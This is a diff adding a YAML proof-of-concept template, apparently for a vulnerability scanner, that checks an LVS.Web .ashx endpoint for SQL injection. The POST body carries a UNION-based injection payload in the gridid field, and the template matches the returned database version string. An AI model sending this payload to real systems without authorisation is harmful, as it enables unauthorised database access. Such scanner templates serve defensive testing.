@@ -1,0 +1,22 @@
+name: poc-yaml-LVS-Webashx-sql
+transport: http
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /ajax/LVS.Web.AgencytaskList,LVS.Web.ashx?_method=GetColumnIndex&_session=r
+      headers:
+        Content-Type: text/plain; charset=UTF-8
+
+      body: 
+        src=AgencytaskList
+
+        gridid=1' UNION ALL SELECT @@VERSION--
+    expression: response.status == 200 && response.body.bcontains(b'<X64> (Build')
+expression: r0()
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/139128740
